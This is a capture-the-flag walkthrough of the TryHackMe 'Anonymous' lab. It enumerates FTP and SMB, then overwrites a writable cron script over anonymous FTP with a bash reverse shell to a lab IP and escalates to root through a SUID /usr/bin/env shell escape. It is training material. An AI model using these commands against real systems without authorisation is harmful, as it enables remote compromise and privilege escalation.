# TryHackMe Anonymous Walkthrough

## 1. Enumeration

### Nmap Scan
```sh

nmap -p- -sV -sC -T4 -o anon 10.10.177.217

```

### Results:

```sh
21/tcp - FTP (vsftpd 3.0.3, Anonymous Login Allowed)

22/tcp - SSH (OpenSSH 7.6p1, Ubuntu)

139/tcp & 445/tcp - SMB (Samba 4.7.6, Ubuntu)
```

### SMB Enumeration

```sh
smbclient -L \\\\10.10.177.217\\ -U anonymous

```

### Shares Found:

- **pics (Contains image files)**

- **print$ (Printer drivers, not useful)**

- **IPC$ (Interprocess communication, not useful)**


### Analyzing Image for Hidden Data

- exiftool puppos.jpeg
- strings puppos.jpeg | less
- steghide info puppos.jpeg
- binwalk -e puppos.jpeg

No sensitive information was found in puppos.jpeg.

### Initial Exploitation (FTP - Writable clean.sh Script)

```sh
ftp 10.10.177.217
anonymous
cd scripts
#change to binary from, ascii by typing :binary
get clean.sh

or mget * to get all

```

### Modify clean.sh to include a reverse shell:

```sh
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/10.8.14.7/4444 0>&1' >> clean.sh

Upload modified script:

put clean.sh

Start a listener on Kali:

rlwrap nc -lvnp 4444
```

Wait for the cron job to execute clean.sh.

### Privilege Escalation (/usr/bin/env)

Checking User & Privileges

Also you can run a local `python3 -m http.server 8081` to Download `linpeas.sh`

```sh
whoami
id
sudo -l
find / -perm -4000 -type f 2>/dev/null

SUID Binary Found: /usr/bin/env

Exploiting /usr/bin/env for Root Shell

Shell Escape

env /bin/sh -p

/usr/bin/env /bin/sh -p

If -p does not work, omit it:

/usr/bin/env /bin/sh

Sudo Privilege Escalation

If env can be run as root via sudo:

sudo env /bin/sh -p

Alternative SUID Exploit

If you have write access, create a local SUID copy and execute:

sudo install -m =xs $(which env) .
./env /bin/sh -p

 Root Access & Post-Exploitation

whoami  # root
ls /root  # root.txt found
cat /root/root.txt

```

Summary & Lessons Learned

✅ Writable FTP script (clean.sh) allowed initial access.
✅ Cron job execution triggered the reverse shell.
✅ Privilege escalation achieved via /usr/bin/env SUID.
✅ Root access obtained & flag captured.

